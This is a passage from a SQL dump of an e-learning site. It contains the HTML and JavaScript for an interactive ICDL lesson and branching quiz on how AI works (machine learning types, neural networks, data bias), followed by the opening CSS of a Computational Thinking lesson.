class="opt-letter">C</span><span class="opt-text">Reinforcement Learning — Layer 4 is a Hidden Layer processing rewards</span></button>\n        <button class="option-btn" onclick="answerQ(4,''D'')"><span class="opt-letter">D</span><span class="opt-text">Unsupervised Learning — Layer 4 clusters similar clothing images together</span></button>\n      </div>\n      <div class="feedback-panel" id="q4-feedback"></div>\n      <div class="branch-panel" id="q4-branch"></div>\n      <button class="btn-next-question" id="q4-next" onclick="nextQuestion(5)">NEXT QUESTION →</button>\n    </div>\n\n    <!-- Q5 -->\n    <div class="question-card" id="q5">\n      <div class="question-type">DATA QUALITY SCENARIO</div>\n      <div class="question-num">QUESTION 5 OF 6</div>\n      <div class="scenario-context">\n        🏦 <strong>Scenario:</strong> Equity Bank trains a loan approval AI using 10 years of historical loan data. Later, they notice the AI keeps rejecting loan applications from women in rural areas, even when their financial profiles are strong. An audit reveals that historically, fewer loans were given to this group.\n      </div>\n      <div class="question-text">What is the ROOT CAUSE of this AI problem, and which data requirement was violated?</div>\n      <div class="options-grid" id="q5-options">\n        <button class="option-btn" onclick="answerQ(5,''A'')"><span class="opt-letter">A</span><span class="opt-text">The algorithm is too complex — they should use a simpler model with fewer layers</span></button>\n        <button class="option-btn" onclick="answerQ(5,''B'')"><span class="opt-letter">B</span><span class="opt-text">The AI has too little data — they need millions more loan records to fix accuracy</span></button>\n        <button class="option-btn" onclick="answerQ(5,''C'')"><span class="opt-letter">C</span><span class="opt-text">Biased training data — the historical data was unbalanced (underrepresented women in rural areas), violating the Balance and Diversity requirements</span></button>\n        <button class="option-btn" onclick="answerQ(5,''D'')"><span class="opt-letter">D</span><span class="opt-text">The AI is not connected to the internet — it needs real-time data from social media</span></button>\n      </div>\n      <div class="feedback-panel" id="q5-feedback"></div>\n      <div class="branch-panel" id="q5-branch"></div>\n      <button class="btn-next-question" id="q5-next" onclick="nextQuestion(6)">NEXT QUESTION →</button>\n    </div>\n\n    <!-- Q6 -->\n    <div class="question-card" id="q6">\n      <div class="question-type">BRANCHING DECISION QUESTION</div>\n      <div class="question-num">QUESTION 6 OF 6</div>\n      <div class="scenario-context">\n        🏫 <strong>Scenario:</strong> M.T.T.I wants to build an AI tutor that adapts to each student''s learning speed. The AI watches how students answer questions, and gets positive feedback when a student''s test score improves, and negative feedback when scores drop. The AI then adjusts how it presents lessons.\n      </div>\n      <div class="question-text">Which combination best describes how this AI tutor works?</div>\n      <div class="options-grid" id="q6-options">\n        <button class="option-btn" onclick="answerQ(6,''A'')"><span class="opt-letter">A</span><span class="opt-text">Unsupervised Learning + Rule-Based AI: The tutor groups students and follows fixed lesson scripts</span></button>\n        <button class="option-btn" onclick="answerQ(6,''B'')"><span class="opt-letter">B</span><span class="opt-text">Reinforcement Learning + Neural Networks: The tutor learns optimal teaching strategies through student feedback rewards, processed by a deep network</span></button>\n        <button class="option-btn" onclick="answerQ(6,''C'')"><span class="opt-letter">C</span><span class="opt-text">Supervised Learning only: The tutor matches students to pre-labeled "lesson types"</span></button>\n        <button class="option-btn" onclick="answerQ(6,''D'')"><span class="opt-letter">D</span><span class="opt-text">Deep Learning only: The tutor just needs many neural network layers to work effectively</span></button>\n      </div>\n      <div class="feedback-panel" id="q6-feedback"></div>\n      <div class="branch-panel" id="q6-branch"></div>\n      <button class="btn-next-question" id="q6-next" onclick="showResults()">SEE MY RESULTS →</button>\n    </div>\n  </div>\n</div>\n\n<!-- ===== RESULTS ===== -->\n<div id="results" class="screen">\n  <div class="institute-badge">MODULE 2 · COMPLETE</div>\n  <div class="score-ring" id="scoreRing" style="--score-pct:0%">\n    <div class="score-inner">\n      <div class="score-num" id="scoreNum">0</div>\n      <div class="score-denom">out of 12</div>\n    </div>\n  </div>\n  <h2 class="results-title" id="resultsTitle">Great Work!</h2>\n  <p class="results-message" id="resultsMessage"></p>\n  <div class="results-breakdown">\n    <div class="breakdown-title">PERFORMANCE BREAKDOWN</div>\n    <div class="breakdown-row"><span class="breakdown-label">Questions Correct</span><span class="breakdown-val good" id="bdCorrect">0 / 6</span></div>\n    <div class="breakdown-row"><span class="breakdown-label">Total Score</span><span class="breakdown-val" id="bdScore">0 / 12</span></div>\n    <div class="breakdown-row"><span class="breakdown-label">Percentage</span><span class="breakdown-val" id="bdPct">0%</span></div>\n    <div class="breakdown-row"><span class="breakdown-label">Grade</span><span class="breakdown-val" id="bdGrade">—</span></div>\n    <div class="breakdown-row"><span class="breakdown-label">Strongest Area</span><span class="breakdown-val" id="bdStrong">—</span></div>\n    <div class="breakdown-row"><span class="breakdown-label">Review Recommended</span><span class="breakdown-val bad" id="bdReview">—</span></div>\n  </div>\n  <div class="results-actions">\n    <button class="btn-action btn-primary" onclick="retakeQuiz()">RETAKE QUIZ</button>\n    <button class="btn-action btn-secondary" onclick="reviewLesson()">REVIEW LESSON</button>\n  </div>\n</div>\n\n<!-- FAB -->\n<button class="fab-speak tooltip" id="fabSpeak" onclick="toggleNarration()" style="display:none">\n  🔊\n  <span class="tooltip-text">Narrate this slide</span>\n</button>\n\n</div><!-- /app -->\n\n<script>\n// ===== STATE =====\nlet currentSlide = 0;\nconst totalSlides = 8;\nlet currentQuestion = 1;\nlet score = 0;\nlet correctAnswers = 0;\nlet userAnswers = {};\nlet speaking = false;\nlet currentUtterance = null;\n\n// Quiz data\nconst quizData = {\n  1: {\n    correct: ''B'',\n    points: 2,\n    topic: ''AI Processing Pipeline'',\n    feedback: {\n      correct: "✅ Correct! The pipeline always starts with Data Input. The AI must first receive the raw data before any processing can occur. In Dr. Amina''s case, the X-ray file (its pixels, resolution, and format) is ingested first.",\n      wrong: "The AI processing pipeline follows a strict order: Input → Processing → Feature Extraction → Pattern Recognition → Decision → Output. You can''t skip straight to diagnosis without first receiving and processing the image."\n    },\n    branches: {\n      A: "🔀 PATH A: Rushing to diagnosis skips critical steps. In a real medical AI, this would be dangerous — the system might output random results. This is why pipeline order matters in life-critical systems.",\n      C: "🔀 PATH C: Pattern Recognition is Step 4, not Step 1. Before patterns can be found, the raw X-ray data must be received and prepared. Starting at Step 4 would mean the AI has no data to work with.",\n      D: "🔀 PATH D: Feature Extraction is Step 3. While it''s closer, skipping the input and data processing steps means the AI would have dirty, unprepared data — leading to poor feature extraction and inaccurate diagnoses."\n    }\n  },\n  2: {\n    correct: ''C'',\n    points: 2,\n    topic: ''Types of Machine Learning'',\n    feedback: {\n      correct: "✅ Correct! Using 500,000 emails labeled ''phishing'' or ''legitimate'' is classic Supervised Learning. The AI learns from labeled examples — just like a student guided by a teacher with answer keys.",\n      wrong: "When training data has labels (phishing / legitimate), that''s the hallmark of Supervised Learning. The labels are the ''teacher'' telling the AI what the correct answer should be."\n    },\n    branches: {\n      A: "🔀 PATH A: If Safaricom had used Unsupervised Learning, the AI would find its own groupings without labels. This could work, but the groups might not correspond to ''phishing vs legitimate'' — the AI might cluster by email length instead!",\n      B: "🔀 PATH B: Reinforcement Learning would work if the AI took actions (block/allow) and received rewards based on outcomes. It''s possible but much slower for email security than supervised learning on existing labeled data.",\n      D: "🔀 PATH D: Deep Learning is a technique (type of neural network), not a type of learning. Deep learning can BE supervised, unsupervised, or reinforcement — it''s about architecture, not learning style."\n    }\n  },\n  3: {\n    correct: ''B'',\n    points: 2,\n    topic: ''Reinforcement Learning'',\n    feedback: {\n      correct: "✅ Excellent! Reinforcement Learning is perfect when: (1) there are no pre-labeled examples of ''correct'' moves, and (2) success can be clearly defined as a reward (winning). James''s AI learns which moves lead to wins through millions of trials.",\n      wrong: "Reinforcement Learning is used when the AI must discover its own strategy through trial and error, guided by a reward signal. It''s ideal for games where there are no pre-labeled ''correct moves''."\n    },\n    branches: {\n      A: "🔀 PATH A: Supervised Learning would require James to label every card move as ''good'' or ''bad'' — which is nearly impossible in a complex card game with millions of possible situations. Reinforcement Learning is far more practical here.",\n      C: "🔀 PATH C: Unsupervised Learning finds natural clusters. It could group similar game states, but it wouldn''t learn a winning strategy — it has no concept of ''winning'' without a reward signal.",\n      D: "🔀 PATH D: Feature Extraction is a step in the pipeline, not a type of learning. Features would be extracted during the process, but the overall learning paradigm remains Reinforcement Learning."\n    }\n  },\n  4: {\n    correct: ''B'',\n    points: 2,\n    topic: ''Neural Networks & Deep Learning'',\n    feedback: {\n      correct: "✅ Perfect! Grace''s network demonstrates Deep Learning''s key strength: hierarchical feature learning. Each layer learns increasingly complex features — from edges to patterns to parts to whole objects. Layer 4 is the Output Layer that produces the final classification.",\n      wrong: "Grace''s network shows how Deep Learning works: each layer builds on the previous one, learning hierarchical representations. The final layer that outputs the classification (''Maasai clothing'') is always the Output Layer."\n    },\n    branches: {\n      A: "🔀 PATH A: Traditional algorithms don''t learn hierarchical features — they follow fixed rules. Also, Layer 4 is clearly the Output (it produces the final answer), not the Input (which would receive raw pixels).",\n      C: "🔀 PATH C: Reinforcement Learning requires a reward/penalty system. Grace is doing image classification with labeled data, which is supervised. Hidden layers process data internally; they don''t output final answers.",\n      D: "🔀 PATH D: Clustering is an Unsupervised Learning task. Grace''s AI is making a binary classification (Maasai/not Maasai), which is supervised. And Layer 4 is the Output Layer, not a clustering mechanism."\n    }\n  },\n  5: {\n    correct: ''C'',\n    points: 2,\n    topic: ''Data Quality & Bias'',\n    feedback: {\n      correct: "✅ Excellent critical thinking! This is a real problem that affects AI systems in finance and healthcare worldwide. The historical data reflected past discrimination, so the AI learned to perpetuate it. The Balance and Diversity data requirements were violated — rural women were underrepresented in the training data.",\n      wrong: "This is a data quality and bias problem. The AI didn''t create the discrimination — it learned it from biased historical data. The solution is to fix the training data, not the algorithm itself."\n    },\n    branches: {\n      A: "🔀 PATH A: Using a simpler model wouldn''t fix bias rooted in training data. A simpler model would still learn from the same skewed historical patterns — it might even amplify them by having less nuance.",\n      B: "🔀 PATH B: More data from the same biased historical source would make the problem worse, not better. If all the new data also reflects historical discrimination against rural women, the AI learns the discrimination more strongly.",\n      D: "🔀 PATH D: Adding real-time social media data could actually introduce more bias and privacy violations. The problem is data balance and diversity, not data recency."\n    }\n  },\n  6: {\n    correct: ''B'',\n    points: 2,\n    topic: ''Integrated AI Concepts'',\n    feedback: {\n      correct: "✅ Outstanding! The M.T.T.I AI tutor combines multiple Module 2 concepts: Reinforcement Learning (learning from student performance rewards) + Neural Networks (processing the complex patterns in learning behavior) + the AI Processing Pipeline (receiving student responses, extracting features, recognizing patterns, making adaptive decisions). This is how real-world adaptive learning systems like Khan Academy''s AI work!",\n      wrong: "The AI tutor uses reward signals (test score improvements) to learn — that''s Reinforcement Learning. And processing complex behavioral patterns requires Neural Networks. Real adaptive tutors combine multiple AI techniques."\n    },\n    branches: {\n      A: "🔀 PATH A: Unsupervised grouping + fixed rules would create a rigid tutor that can''t truly adapt. The AI would put students in buckets but follow the same scripts — missing the ''adaptive'' part entirely.",\n      C: "🔀 PATH C: Pure Supervised Learning would require pre-labeling every student interaction as ''good teaching'' or ''bad teaching'' — an impossible task. The AI needs to discover effective strategies through experimentation.",\n      D: "🔀 PATH D: ''Many layers'' alone doesn''t make an adaptive tutor. Deep Learning is a tool, but without the Reinforcement Learning framework (reward signals, trial and error), the AI has no mechanism to improve its teaching."\n    }\n  }\n};\n\n// Narration texts per slide\nconst narrations = [\n  "Welcome to Module 2: How Does AI Work? In this module, we will explore the core principles behind artificial intelligence, including algorithms, machine learning, neural networks, and how AI systems process information to make decisions.",\n  "Let''s start with algorithms. An algorithm is a step-by-step procedure for solving a problem. Traditional algorithms follow fixed, human-written rules. But AI algorithms learn the rules themselves from data. Instead of a programmer writing every rule, an AI looks at thousands of examples and learns patterns on its own.",\n  "Every AI system processes information through a pipeline. First, data is input. Then it is cleaned and prepared. Next, the AI extracts important features. After that, it recognizes patterns. Finally, it makes a decision and delivers an output. This pipeline is the foundation of every AI application you use today.",\n  "Machine Learning has three main types. Supervised Learning uses labeled examples — like a student with a teacher. Unsupervised Learning finds hidden patterns in unlabeled data. And Reinforcement Learning learns through trial and error with rewards and penalties — just like training a dog with treats.",\n  "Neural networks are inspired by the human brain. They have an input layer that receives data, hidden layers that process and transform it, and an output layer that produces the final result. Networks learn by adjusting connection strengths across millions of training cycles until they accurately recognize patterns.",\n  "Deep Learning uses neural networks with many layers. Each layer learns increasingly complex features. For image recognition, early layers detect edges, middle layers detect shapes and parts, and final layers identify complete objects. This hierarchical learning powers most modern AI breakthroughs.",\n  "AI needs data like humans need education. Five requirements matter: Volume — enough examples to learn from. Quality — accurate, clean data. Diversity — representing all real scenarios. Relevance — data related to the actual problem. And Balance — equal representation to prevent biased AI.",\n  "You have completed all sections of Module 2! You have learned about algorithms, the processing pipeline, three types of machine learning, neural networks, deep learning, and data requirements. Now get ready for the branching scenario quiz to test your knowledge."\n];\n\n// ===== LESSON NAVIGATION =====\nfunction startLesson() {\n  document.getElementById(''splash'').classList.remove(''active'');\n  document.getElementById(''lesson'').classList.add(''active'');\n  document.getElementById(''fabSpeak'').style.display = ''flex'';\n  updateProgress();\n}\n\nfunction changeSlide(dir) {\n  const slides = document.querySelectorAll(''.slide'');\n  slides[currentSlide].classList.remove(''active'');\n  currentSlide = Math.max(0, Math.min(totalSlides - 1, currentSlide + dir));\n  slides[currentSlide].classList.add(''active'');\n\n  document.getElementById(''btnPrev'').disabled = currentSlide === 0;\n  document.getElementById(''btnNext'').textContent = currentSlide === totalSlides - 1 ? ''QUIZ ▶'' : ''NEXT ▶'';\n\n  if (currentSlide === totalSlides - 1) {\n    document.getElementById(''btnNext'').onclick = startQuiz;\n  } else {\n    document.getElementById(''btnNext'').onclick = () => changeSlide(1);\n  }\n\n  stopNarration();\n  document.getElementById(''narrationText'').textContent = "Click 🔊 to hear narration for this slide.";\n  updateProgress();\n}\n\nfunction updateProgress() {\n  const pct = Math.round((currentSlide / (totalSlides - 1)) * 100);\n  document.getElementById(''progressFill'').style.width = pct + ''%'';\n  document.getElementById(''progressLabel'').textContent = pct + ''%'';\n}\n\n// ===== NARRATION =====\nfunction toggleNarration() {\n  if (speaking) {\n    stopNarration();\n  } else {\n    startNarration();\n  }\n}\n\nfunction startNarration() {\n  if (!(''speechSynthesis'' in window)) {\n    document.getElementById(''narrationText'').textContent = "Speech synthesis not supported in this browser. Try Chrome or Edge.";\n    return;\n  }\n  stopNarration();\n\n  const text = narrations[currentSlide];\n  currentUtterance = new SpeechSynthesisUtterance(text);\n  currentUtterance.rate = 0.95;\n  currentUtterance.pitch = 1.0;\n  currentUtterance.volume = 1.0;\n\n  // Try to pick a clear voice\n  const voices = speechSynthesis.getVoices();\n  const preferred = voices.find(v => v.lang.startsWith(''en'') && (v.name.includes(''Female'') || v.name.includes(''Google'') || v.name.includes(''Microsoft'')));\n  if (preferred) currentUtterance.voice = preferred;\n\n  currentUtterance.onstart = () => {\n    speaking = true;\n    document.getElementById(''narrationText'').textContent = text;\n    document.getElementById(''btnSpeak'').textContent = ''⏹ STOP'';\n    document.getElementById(''btnSpeak'').classList.add(''speaking'');\n    document.getElementById(''narrationIcon'').textContent = ''⏸'';\n    document.getElementById(''fabSpeak'').classList.add(''speaking'');\n    document.getElementById(''fabSpeak'').textContent = ''⏸'';\n  };\n\n  currentUtterance.onend = () => {\n    speaking = false;\n    document.getElementById(''btnSpeak'').textContent = ''▶ NARRATE'';\n    document.getElementById(''btnSpeak'').classList.remove(''speaking'');\n    document.getElementById(''narrationIcon'').textContent = ''🔊'';\n    document.getElementById(''fabSpeak'').classList.remove(''speaking'');\n    document.getElementById(''fabSpeak'').textContent = ''🔊'';\n  };\n\n  speechSynthesis.speak(currentUtterance);\n}\n\nfunction stopNarration() {\n  if (speechSynthesis) speechSynthesis.cancel();\n  speaking = false;\n  document.getElementById(''btnSpeak'').textContent = ''▶ NARRATE'';\n  document.getElementById(''btnSpeak'').classList.remove(''speaking'');\n  document.getElementById(''narrationIcon'').textContent = ''🔊'';\n  document.getElementById(''fabSpeak'').classList.remove(''speaking'');\n  document.getElementById(''fabSpeak'').textContent = ''🔊'';\n}\n\n// ===== QUIZ =====\nfunction startQuiz() {\n  stopNarration();\n  document.getElementById(''lesson'').classList.remove(''active'');\n  document.getElementById(''quiz'').classList.add(''active'');\n  document.getElementById(''fabSpeak'').style.display = ''none'';\n}\n\nfunction answerQ(qNum, choice) {\n  const qData = quizData[qNum];\n  const options = document.querySelectorAll(`#q${qNum}-options .option-btn`);\n  const feedback = document.getElementById(`q${qNum}-feedback`);\n  const branch = document.getElementById(`q${qNum}-branch`);\n  const nextBtn = document.getElementById(`q${qNum}-next`);\n\n  // Disable all options\n  options.forEach(btn => btn.disabled = true);\n\n  const isCorrect = choice === qData.correct;\n  userAnswers[qNum] = { choice, isCorrect };\n\n  if (isCorrect) {\n    score += qData.points;\n    correctAnswers++;\n  }\n\n  // Highlight answers\n  const letters = [''A'',''B'',''C'',''D''];\n  options.forEach((btn, i) => {\n    const letter = letters[i];\n    if (letter === qData.correct) {\n      btn.classList.add(''correct'');\n    } else if (letter === choice && !isCorrect) {\n      btn.classList.add(''wrong'');\n    } else {\n      btn.classList.add(''revealed'');\n    }\n  });\n\n  // Show feedback\n  feedback.className = `feedback-panel show ${isCorrect ? ''correct'' : ''wrong''}`;\n  feedback.innerHTML = `\n    <div class="feedback-header">${isCorrect ? ''✅ CORRECT!'' : ''❌ NOT QUITE''}</div>\n    <div class="feedback-text">${isCorrect ? qData.feedback.correct : qData.feedback.wrong}</div>\n  `;\n\n  // Show branch consequence\n  if (!isCorrect && qData.branches[choice]) {\n    branch.className = ''branch-panel show'';\n    branch.innerHTML = `\n      <div class="branch-header">CONSEQUENCE PATH</div>\n      <div class="branch-text">${qData.branches[choice]}</div>\n    `;\n  } else if (isCorrect) {\n    branch.className = ''branch-panel show'';\n    branch.innerHTML = `\n      <div class="branch-header">🌟 INSIGHT PATH</div>\n      <div class="branch-text">You correctly identified <strong>${qData.topic}</strong>. This concept powers real AI systems used in Kenya and globally — from M-Pesa fraud detection to crop disease identification drones.</div>\n    `;\n  }\n\n  nextBtn.classList.add(''show'');\n\n  // Update quiz progress\n  document.getElementById(''quizProgressLabel'').textContent = `Question ${qNum} of 6`;\n}\n\nfunction nextQuestion(qNum) {\n  document.getElementById(`q${qNum-1}`).classList.remove(''active'');\n  document.getElementById(`q${qNum}`).classList.add(''active'');\n  document.getElementById(''quizProgressLabel'').textContent = `Question ${qNum} of 6`;\n}\n\nfunction showResults() {\n  document.getElementById(''quiz'').classList.remove(''active'');\n  document.getElementById(''results'').classList.add(''active'');\n  document.getElementById(''fabSpeak'').style.display = ''none'';\n\n  const pct = Math.round((score / 12) * 100);\n  const scorePct = pct + ''%'';\n\n  document.getElementById(''scoreRing'').style.setProperty(''--score-pct'', scorePct);\n\n  // Animate score\n  let displayed = 0;\n  const interval = setInterval(() => {\n    if (displayed >= score) { clearInterval(interval); return; }\n    displayed++;\n    document.getElementById(''scoreNum'').textContent = displayed;\n  }, 150);\n\n  // Grade\n  let grade, title, message, strong, review;\n  if (pct >= 90) {\n    grade = ''A+''; title = ''🏆 Outstanding!'';\n    message = ''Excellent mastery of Module 2! You understand AI algorithms, machine learning types, neural networks, and data requirements at a professional level.'';\n  } else if (pct >= 75) {\n    grade = ''B''; title = ''🎯 Well Done!'';\n    message = ''Good understanding of the core Module 2 concepts. Review the topics you missed and you\\''ll be fully prepared for the ICDL exam.'';\n  } else if (pct >= 60) {\n    grade = ''C''; title = ''📚 Keep Studying'';\n    message = ''You have a basic grasp of the material. We recommend reviewing the lesson slides and retaking the quiz to strengthen your understanding.'';\n  } else {\n    grade = ''D''; title = ''🔄 Needs Review'';\n    message = ''The Module 2 concepts need more practice. Go through each slide carefully, paying special attention to the three types of Machine Learning and neural network structure.'';\n  }\n\n  // Find weakest topic\n  const weakTopics = Object.values(userAnswers)\n    .filter(a => !a.isCorrect)\n    .map((a, i) => quizData[Object.keys(userAnswers)[i]]?.topic)\n    .filter(Boolean);\n\n  const strongTopics = Object.values(userAnswers)\n    .filter(a => a.isCorrect)\n    .map((a, i) => quizData[Object.keys(userAnswers)[i]]?.topic)\n    .filter(Boolean);\n\n  document.getElementById(''resultsTitle'').textContent = title;\n  document.getElementById(''resultsMessage'').textContent = message;\n  document.getElementById(''bdCorrect'').textContent = `${correctAnswers} / 6`;\n  document.getElementById(''bdScore'').textContent = `${score} / 12`;\n  document.getElementById(''bdPct'').textContent = `${pct}%`;\n  document.getElementById(''bdGrade'').textContent = grade;\n  document.getElementById(''bdStrong'').textContent = strongTopics[0] || ''Keep practicing!'';\n  document.getElementById(''bdReview'').textContent = weakTopics[0] || ''None — Perfect!'';\n\n  if (weakTopics.length === 0) {\n    document.getElementById(''bdReview'').className = ''breakdown-val good'';\n  }\n}\n\nfunction retakeQuiz() {\n  // Reset state\n  score = 0; correctAnswers = 0; userAnswers = {}; currentQuestion = 1;\n\n  // Reset all questions\n  for (let i = 1; i <= 6; i++) {\n    const card = document.getElementById(`q${i}`);\n    card.classList.remove(''active'');\n\n    const options = card.querySelectorAll(''.option-btn'');\n    options.forEach(btn => {\n      btn.disabled = false;\n      btn.className = ''option-btn'';\n    });\n\n    document.getElementById(`q${i}-feedback`).className = ''feedback-panel'';\n    document.getElementById(`q${i}-feedback`).innerHTML = '''';\n    document.getElementById(`q${i}-branch`).className = ''branch-panel'';\n    document.getElementById(`q${i}-branch`).innerHTML = '''';\n    document.getElementById(`q${i}-next`).classList.remove(''show'');\n  }\n\n  document.getElementById(''q1'').classList.add(''active'');\n  document.getElementById(''quizProgressLabel'').textContent = ''Question 1 of 6'';\n  document.getElementById(''results'').classList.remove(''active'');\n  document.getElementById(''quiz'').classList.add(''active'');\n  document.getElementById(''fabSpeak'').style.display = ''none'';\n}\n\nfunction reviewLesson() {\n  stopNarration();\n  currentSlide = 0;\n  document.querySelectorAll(''.slide'').forEach((s, i) => {\n    s.classList.toggle(''active'', i === 0);\n  });\n  document.getElementById(''results'').classList.remove(''active'');\n  document.getElementById(''lesson'').classList.add(''active'');\n  document.getElementById(''fabSpeak'').style.display = ''flex'';\n  document.getElementById(''btnPrev'').disabled = true;\n  document.getElementById(''btnNext'').textContent = ''NEXT ▶'';\n  document.getElementById(''btnNext'').onclick = () => changeSlide(1);\n  updateProgress();\n}\n\n// Load voices on page load\nif (''speechSynthesis'' in window) {\n  speechSynthesis.getVoices();\n  speechSynthesis.onvoiceschanged = () => speechSynthesis.getVoices();\n}\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 1, 'Published', 1, '2026-03-10 02:42:27', '2026-03-11 06:06:47', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(17, 9, NULL, 'Computaional Thinking', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Computational Thinking · ICDL Coding Principles</title>\n<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:ital,wght@0,300;0,400;1,300&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">\n<style>\n  :root {\n    --navy: #0a1628;\n    --navy2: #0f2044;\n    --blue: #1a5cf6;\n    --cyan: #00d4ff;\n    --lime: #b6ff4e;\n    --white: #f5f7ff;\n    --muted: #8892a4;\n    --glass: rgba(255,255,255,0.05);\n    --glass-border: rgba(255,255,255,0.10);\n    --card: rgba(15,32,68,0.85);\n    --correct: #2ecc71;\n    --wrong: #e74c3c;\n    --warn: #f39c12;\n  }\n\n  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }\n\n  body {\n    background: var(--navy);\n    color: var(--white);\n    font-family: ''DM Sans'', sans-serif;\n    min-height: 100vh;\n    overflow-x: hidden;\n  }\n\n  /* ── BACKGROUND ── */\n  body::before {\n    content: '''';\n    position: fixed; inset: 0; z-index: 0;\n    background:\n      radial-gradient(ellipse 80% 60% at 10% 0%, rgba(26,92,246,0.18) 0%, transparent 60%),\n      radial-gradient(ellipse 60% 50% at 90% 100%, rgba(0,212,255,0.12) 0%, transparent 55%),\n      radial-gradient(ellipse 40% 40% at 50% 50%, rgba(182,255,78,0.04) 0%, transparent 60%);\n    pointer-events: none;\n  }\n\n  /* grid lines */\n  body::after {\n    content: '''';\n    position: fixed; inset: 0; z-index: 0;\n    background-image:\n      linear-gradient(rgba(26,92,246,0.04) 1px, transparent 1px),\n      linear-gradient(90deg, rgba(26,92,246,0.04) 1px, transparent 1px);\n    background-size: 48px 48px;\n    pointer-events: none;\n  }\n\n  /* ── LAYOUT ── */\n  #app { position: relative; z-index: 1; max-width: 960px; margin: 0 auto; padding: 0 20px 80px; }\n\n  /* ── TOP BAR ── */\n  header {\n    display: flex; align-items: center; justify-content: space-between;\n    padding: 28px 0 20px;\n    border-bottom: 1px solid var(--glass-border);\n    margin-bottom: 40px;\n  }\n  .logo-tag {\n    font-family: ''Syne'', sans-serif;\n    font-size: 11px; font-weight: 700; letter-spacing: 3px; text-transform: uppercase;\n    color: var(--cyan);\n    display: flex; align-items: center; gap: 8px;\n  }\n  .logo-tag span { color: var(--muted); }\n  .module-badge {\n    background: rgba(26,92,246,0.2);\n    border: 1px solid rgba(26,92,246,0.4);\n    color: var(--cyan);\n    font-family: ''DM Mono'', monospace; font-size: 10px; letter-spacing: 1px;\n    padding: 4px 12px; border-radius: 20px;\n  }\n\n  /* ── PROGRESS BAR ── */\n  .progress-wrap { margin-bottom: 36px; }\n  .progress-label {\n    display: flex; justify-content: space-between; align-items: center;\n    font-size: 11px; font-family: ''DM Mono'', monospace; color: var(--muted);\n    margin-bottom: 8px;\n  }\n  .progress-track {\n    height: 4px; background: var(--glass-border); border-radius: 99px; overflow: hidden;\n  }\n  .progress-fill {\n    height: 100%; background: linear-gradient(90deg, var(--blue), var(--cyan));\n    border-radius: 99px; transition: width 0.6s cubic-bezier(.4,0,.2,1);\n    box-shadow: 0 0 12px rgba(0,212,255,0.5);\n  }\n\n  /* ── SECTION SCREENS ── */\n  .screen { display: none; animation: fadeUp 0.5s ease both; }\n  .screen.active { display: block; }\n  @keyframes fadeUp {\n    from { opacity: 0; transform: translateY(24px); }\n    to   { opacity: 1; transform: translateY(0); }\n  }\n\n  /* ── CHAPTER HERO ── */\n  .chapter-hero {\n    background: var(--card);\n    border: 1px solid var(--glass-border);\n    border-radius: 20px;\n    padding: 52px 48px;\n    margin-bottom: 28px;\n    position: relative; overflow: hidden;\n  }\n  .chapter-hero::before {\n    content: attr(data-num);\n    position: absolute; right: -20px; top: -20px;\n    font-family: ''Syne'', sans-serif; font-size: 160px; font-weight: 800;\n    color: rgba(26,92,246,0.07); line-height: 1; pointer-events: none;\n    user-select: none;\n  }\n  .chapter-eyebrow {\n    font-family: ''DM Mono'', monospace; font-size: 11px; letter-spacing: 2px; text-transform: uppercase;\n    color: var(--cyan); margin-bottom: 14px;\n  }\n  .chapter-title {\n    font-family: ''Syne'', sans-serif; font-size: 36px; font-weight: 800; line-height: 1.15;\n    margin-bottom: 16px;\n  }\n  .chapter-title em { font-style: normal; color: var(--lime); }\n  .chapter-desc {\n    color: rgba(245,247,255,0.65); line-height: 1.7; max-width: 600px;\n    font-size: 15px;\n  }\n\n  /* ── NARRATION BAR ── */\n  .narration-bar {\n    background: var(--glass);\n    border: 1px solid var(--glass-border);\n    border-radius: 14px;\n    padding: 16px 22px;\n    display: flex; align-items: center; gap: 16px;\n    margin-bottom: 28px;\n  }\n  .narr-btn {\n    width: 44px; height: 44px; border-radius: 50%;\n    background: linear-gradient(135deg, var(--blue), var(--cyan));\n    border: none; cursor: pointer;\n    display: flex; align-items: center; justify-content: center;\n    flex-shrink: 0; transition: transform 0.2s, box-shadow 0.2s;\n    box-shadow: 0 0 0 0 rgba(0,212,255,0);\n  }\n  .narr-btn:hover { transform: scale(1.08); box-shadow: 0 0 18px rgba(0,212,255,0.4); }\n  .narr-btn.playing { animation: pulse-ring 1.4s ease infinite; }\n  @keyframes pulse-ring {\n    0%   { box-shadow: 0 0 0 0 rgba(0,212,255,0.5); }\n    70%  { box-shadow: 0 0 0 10px rgba(0,212,255,0); }\n    100% { box-shadow: 0 0 0 0 rgba(0,212,255,0); }\n  }\n  .narr-btn svg { width: 18px; height: 18px; fill: white; pointer-events: none; }\n  .narr-text { font-size: 13px; color: var(--muted); line-height: 1.5; }\n  .narr-text strong { color: var(--white); display: block; margin-bottom: 2px; font-size: 13px; }\n  .narr-waves { display: flex; align-items: center; gap: 3px; margin-left: auto; }\n  .narr-waves span {\n    display: block; width: 3px; background: var(--cyan); border-radius: 3px;\n    animation: none; opacity: 0.3;\n  }\n  .narr-waves.active span { animation: wave 1s ease infinite; opacity: 1; }\n  .narr-waves span:nth-child(1) { height: 12px; }\n  .narr-waves span:nth-child(2) { height: 22px; animation-delay: 0.1s; }\n  .narr-waves span:nth-child(3) { height: 16px; animation-delay: 0.2s; }\n  .narr-waves span:nth-child(4) { height: 28px; animation-delay: 0.3s; }\n  .narr-waves span:nth-child(5) { height: 14px; animation-delay: 0.4s; }\n  @keyframes wave {\n    0%, 100% { transform: scaleY(0.5); }\n    50%       { transform: scaleY(1.3); }\n  }\n\n  /* ── CONTENT CARDS ── */\n  .content-card {\n    background: var(--card);\n    border: 1px solid var(--glass-border);\n    border-radius: 16px;\n    padding: 32px 36px;\n    margin-bottom: 20px;\n  }\n  .card-tag {\n    font-family: ''DM Mono'', monospace; font-size: 10px; letter-spacing: 2px; text-transform: uppercase;\n    color: var(--lime); margin-bottom: 12px; display: block;\n  }\n  .content-card h3 {\n    font-family: ''Syne'', sans-serif; font-size: 20px; font-weight: 700;\n    margin-bottom: 14px;\n  }\n  .content-card p { color: rgba(245,247,255,0.7); line-height: 1.75; font-size: 14.5px; }\n  .content-card p + p { margin-top: 12px; }\n\n  /* ── SCENARIO 